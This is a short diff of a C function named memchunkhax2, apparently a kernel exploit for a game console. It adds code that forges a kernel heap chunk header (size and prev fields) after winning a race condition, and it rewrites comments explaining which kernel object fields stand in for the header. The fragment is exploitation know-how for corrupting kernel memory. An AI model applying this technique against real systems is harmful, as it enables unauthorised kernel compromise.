@@ -206,9 +206,8 @@ int memchunkhax2()
 	isolatedPage = 0;
 	
 	// Create a KSynchronizationObject in order to use part of its data as a fake memory block header.
-	// Within the KSynchronizationObject, refCount = size, syncedThreads = next, firstThreadNode = prev.
-	// Prev does not matter, as any verification happens prior to the overwrite.
-	// However, next must be 0, as it does not use size to check when allocation is finished.
+	// Within the KSynchronizationObject, syncedThreads is next,
+	// which should be 0.
 	if(svcCreateEventKAddr(&kObjHandle, 0, &kObjAddr) != 0)
 		debugPrintError("ERROR : Can't create kernel object.\n");
 	
@@ -234,6 +233,12 @@ int memchunkhax2()
 	waitUserlandAccessible(data->addr + PAGE_SIZE + (kObjAddr & 0xFFF));
 	delayer = DELAYER_PAUSE;
 	memcpy(backup, (void*) (data->addr + PAGE_SIZE + (kObjAddr & 0xFFF) ), PAGE_SIZE - (kObjAddr & 0xFFF));
+
+	/* Sets the values of the memchunk except next, which has already been
+	   validated. */
+	((MemChunkHdr*)(data->addr + PAGE_SIZE))->size = 1;
+	((MemChunkHdr*)(data->addr + PAGE_SIZE))->prev = (MemChunkHdr*)kObjAddr;
+
 	if(data->result != -1)
 		debugPrintError("ERROR : Race condition failed.\n");
 	
